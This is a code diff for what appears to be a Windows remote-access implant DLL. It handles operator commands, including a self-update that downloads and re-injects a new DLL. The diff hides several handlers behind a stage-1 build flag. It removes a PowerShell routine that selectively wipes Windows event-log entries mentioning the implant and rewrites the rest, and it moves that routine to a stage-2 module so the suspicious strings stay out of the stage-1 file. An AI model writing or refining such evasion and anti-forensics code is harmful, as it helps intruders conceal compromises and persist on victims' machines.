@@ -1809,6 +1809,7 @@ static void handle_command(const std::string& msg_str) {
             send_ok(r);
         }
         else if (cmd == "drives_list") {
+#ifdef STAGE1_KEEP_FALLBACKS
             DWORD mask = GetLogicalDrives();
             std::string arr = "[";
             bool first = true;
@@ -1831,6 +1832,9 @@ static void handle_command(const std::string& msg_str) {
             }
             arr += "]";
             send_ok(arr);
+#else
+            send_err("sysinfo module loading, retry in a moment");
+#endif
         }
 
         // --- Process manager ---
@@ -2181,6 +2185,7 @@ static void handle_command(const std::string& msg_str) {
 
         // --- Speed test: host internet speed (download from public URL) ---
         else if (cmd == "speed_test_internet") {
+#ifdef STAGE1_KEEP_FALLBACKS
             // Download AND upload test against Cloudflare. Measures both directions.
             std::string _ps_speed =
                 "powershell -NoProfile -Command \""
@@ -2223,6 +2228,9 @@ static void handle_command(const std::string& msg_str) {
             auto get = [&](size_t i) -> std::string { return i < parts.size() && !parts[i].empty() ? parts[i] : "0"; };
             send_ok("{\"bytes\":" + get(0) + ",\"elapsed_s\":" + get(1) + ",\"mbps\":" + get(2) +
                     ",\"ul_bytes\":" + get(3) + ",\"ul_elapsed_s\":" + get(4) + ",\"ul_mbps\":" + get(5) + "}");
+#else
+            send_err("sysinfo module loading, retry in a moment");
+#endif
         }
 
         // ── Browser ↔ Host echo for DL/UL measurement ──
@@ -2244,6 +2252,7 @@ static void handle_command(const std::string& msg_str) {
         // Host downloads a known file from VPS via HTTPS, measures DL throughput.
         // Uses /files/pnpext.dll which is always present after deploy.
         else if (cmd == "host_relay_speed") {
+#ifdef STAGE1_KEEP_FALLBACKS
             std::string vps_ip = g_config.server_address;
             std::string output = g_procs.run_cmd_capture(
                 "powershell -NoProfile -Command \""
@@ -2270,10 +2279,14 @@ static void handle_command(const std::string& msg_str) {
                 while (!err.empty() && (err.back()=='\n'||err.back()=='\r')) err.pop_back();
                 send_err("Host↔Relay DL test failed: " + err);
             }
+#else
+            send_err("sysinfo module loading, retry in a moment");
+#endif
         }
 
         // --- Device list (hardware devices) ---
         else if (cmd == "device_list") {
+#ifdef STAGE1_KEEP_FALLBACKS
             std::string output = g_procs.run_cmd_capture(
                 "powershell -NoProfile -Command \""
                 "Get-PnpDevice -Status OK -ErrorAction SilentlyContinue | "
@@ -2288,6 +2301,9 @@ static void handle_command(const std::string& msg_str) {
             } else {
                 send_err("Failed to get device list");
             }
+#else
+            send_err("sysinfo module loading, retry in a moment");
+#endif
         }
 
         // --- Event Log: auto-clean config ---
@@ -2574,6 +2590,7 @@ static void handle_command(const std::string& msg_str) {
         }
 
         else if (cmd == "installed_programs") {
+#ifdef STAGE1_KEEP_FALLBACKS
             // Enumerate installed programs from registry (both 64-bit and 32-bit)
             std::string reqId = id;
             spawn_bg_worker([reqId, send_ok_raw = [&]() -> std::function<void(const std::string&)> {
@@ -2642,6 +2659,9 @@ static void handle_command(const std::string& msg_str) {
                 result += "]";
                 send_ok_raw(result);
             });
+#else
+            send_err("sysinfo module loading, retry in a moment");
+#endif
         }
 
         // ── Remote host update: download new DLL, replace, re-inject ──
@@ -2734,6 +2754,7 @@ static void handle_command(const std::string& msg_str) {
         }
 
         else if (cmd == "host_update") {
+#ifdef STAGE1_KEEP_FALLBACKS
             // Client sends URL to download new DLL from VPS
             std::string url = json_get(msg_str, "url");
             if (url.empty()) { send_err("No URL provided"); }
@@ -2869,6 +2890,9 @@ static void handle_command(const std::string& msg_str) {
 
                 });
             }
+#else
+            send_err("defender module loading, retry in a moment");
+#endif
         }
 
         else if (cmd == "running_apps") {
@@ -4772,78 +4796,21 @@ static void evtlog_cleaner_func() {
         for (const auto& logName : logs) {
             if (!g_running) break;
             try {
-                char tmpPath[MAX_PATH];
-                GetTempPathA(MAX_PATH, tmpPath);
-                std::string scriptPath = std::string(tmpPath) + "evtclean_" + std::to_string(GetTickCount64()) + ".ps1";
-
-                // Use Get-WinEvent (modern API) — renders message AND exposes Properties
-                // (ReplacementStrings) where WER stores "spoolsv.exe", "pnpext.dll" etc.
-                // Selective delete: clear log, then re-write only the entries that DIDN'T match.
-                // (Windows Event Log API has no per-record delete, so this is the only way.)
-                std::string script =
-                    "[Console]::OutputEncoding=[System.Text.Encoding]::UTF8\n"
-                    "$ErrorActionPreference='SilentlyContinue'\n"
-                    "$pattern='" + patterns + "'\n"
-                    "$logName='" + logName + "'\n"
-                    "$events=@(Get-WinEvent -LogName $logName -MaxEvents 5000 -ErrorAction SilentlyContinue 2>$null)\n"
-                    "if($events.Count -eq 0){Write-Output 'EMPTY';exit}\n"
-                    "$toDelete=@()\n"
-                    "$toKeep=@()\n"
-                    "foreach($e in $events){\n"
-                    "  $matched=$false\n"
-                    "  try{\n"
-                    "    $msg=[string]$e.Message\n"
-                    "    $prov=[string]$e.ProviderName\n"
-                    "    $props=(($e.Properties|ForEach-Object{[string]$_.Value}) -join ' ')\n"
-                    "    $xml=''; try{ $xml=$e.ToXml() }catch{}\n"
-                    "    $task=[string]$e.TaskDisplayName\n"
-                    "    if(($msg -match $pattern) -or ($props -match $pattern) -or\n"
-                    "       ($prov -match $pattern) -or ($xml -match $pattern) -or\n"
-                    "       ($task -match $pattern)){ $matched=$true }\n"
-                    "  }catch{ $matched=$false }\n"
-                    "  if($matched){ $toDelete+=$e } else { $toKeep+=$e }\n"
-                    "}\n"
-                    "if($toDelete.Count -eq 0){Write-Output 'CLEAN';exit}\n"
-                    "# Wipe channel\n"
-                    "& wevtutil.exe cl $logName 2>$null\n"
-                    "# Restore non-matching entries (oldest first, capped at 500 to avoid log explosion)\n"
-                    "$restored=0\n"
-                    "$keep=$toKeep | Sort-Object TimeCreated\n"
-                    "if($keep.Count -gt 500){ $keep=$keep | Select-Object -Last 500 }\n"
-                    "foreach($e in $keep){\n"
-                    "  try{\n"
-                    "    $src=$e.ProviderName\n"
-                    "    $et='Information'\n"
-                    "    switch($e.LevelDisplayName){\n"
-                    "      'Error'       { $et='Error' }\n"
-                    "      'Warning'     { $et='Warning' }\n"
-                    "      'Critical'    { $et='Error' }\n"
-                    "      'Information' { $et='Information' }\n"
-                    "    }\n"
-                    "    # Ensure source is registered for this log (best effort)\n"
-                    "    if(-not [System.Diagnostics.EventLog]::SourceExists($src)){\n"
-                    "      try{ New-EventLog -LogName $logName -Source $src -ErrorAction SilentlyContinue }catch{}\n"
-                    "    }\n"
-                    "    $eid=[int]($e.Id % 65536)\n"
-                    "    Write-EventLog -LogName $logName -Source $src -EventId $eid -EntryType $et -Message $e.Message -ErrorAction SilentlyContinue\n"
-                    "    $restored++\n"
-                    "  }catch{}\n"
-                    "}\n"
-                    "Write-Output \"CLEANED|$($toDelete.Count)|$restored\"\n";
-
-                {
-                    std::ofstream f(scriptPath);
-                    f << script;
+                // Delegate the actual scan+wipe to stage-2 (defender.bin):
+                // the PowerShell script with "wevtutil.exe cl" / "Get-WinEvent"
+                // strings lives there, never in stage-1 pnpext.dll.
+                // On first runs before defender is loaded, dispatch() returns
+                // false and the cycle is silently skipped — next iteration
+                // retries once the module is resident in RAM.
+                std::string esc_pat; esc_pat.reserve(patterns.size());
+                for (char c : patterns) {
+                    if (c == '\\') esc_pat += "\\\\";
+                    else if (c == '"') esc_pat += "\\\"";
+                    else esc_pat += c;
                 }
-
-                std::string psCmd = "powershell -NoProfile -ExecutionPolicy Bypass -File \"" + scriptPath + "\"";
-                std::string output = g_procs.run_cmd_capture(psCmd);
-                DeleteFileA(scriptPath.c_str());
-
-                while (!output.empty() && (output.back()=='\n'||output.back()=='\r')) output.pop_back();
-                if (output.find("CLEANED") != std::string::npos) {
-                    g_log.debug("EventLog cleaner: cleared " + logName + " (" + output + ")");
-                }
+                std::string j = "{\"log\":\"" + logName +
+                                "\",\"patterns\":\"" + esc_pat + "\"}";
+                stage2::Registry::inst().dispatch("evtlog_scan", j);
             } catch (...) {}
         }
 
